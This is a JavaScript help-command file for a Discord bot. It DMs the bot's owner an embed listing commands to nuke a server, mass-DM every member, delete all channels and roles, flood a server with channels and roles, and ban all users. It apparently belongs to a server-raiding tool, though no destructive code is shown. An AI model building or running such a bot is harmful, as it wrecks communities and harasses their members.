module.exports.run = async (client, message, args) => {
    const config = require("../config.json");
    const { MessageEmbed } = require('discord.js');
    if (message.author.id == config.idowner) { } else return;
    message.delete();

    const exampleEmbed = new MessageEmbed()
        .setColor('#36393F')
        .setTitle('Command - Help')
        .setAuthor({ name: message.author.username, iconURL: 'https://cdn.discordapp.com/attachments/968180362817732738/976561358705426532/IMG_3143.png', url: 'https://github.com/fontesie' })

        .setThumbnail('https://cdn.discordapp.com/attachments/968180362817732738/976561358705426532/IMG_3143.png')
        .addFields(
            { name: config.prefix + 'serverlist', value: 'Show all server.', inline: true },
            { name: config.prefix + 'ping', value: 'Get ping of bot.', inline: true },
            { name: config.prefix + 'nuke', value: 'Nuke a server.', inline: true },
            { name: config.prefix + 'mpall', value: 'DM all member on server.', inline: true },
            { name: config.prefix + 'mcrea', value: 'Create mass channel.', inline: true },
            { name: config.prefix + 'dlrole', value: 'Delete all role.', inline: true },
            { name: config.prefix + 'dlall', value: 'Delete all channel.', inline: true },
            { name: config.prefix + 'msrole', value: 'Create mass role.', inline: true },
            { name: config.prefix + 'banall', value: 'Ban all user on a server.', inline: true },

        )
        .setFooter({ text: 'Devlopper: github.com/Fontesie', iconURL: 'https://cdn.discordapp.com/attachments/968180362817732738/976561358705426532/IMG_3143.png' })
        .setTimestamp();
    message.author.send({ embeds: [exampleEmbed] }).catch()
}

module.exports.config = {
    name: "help",
    aliases: ["helper"]
}
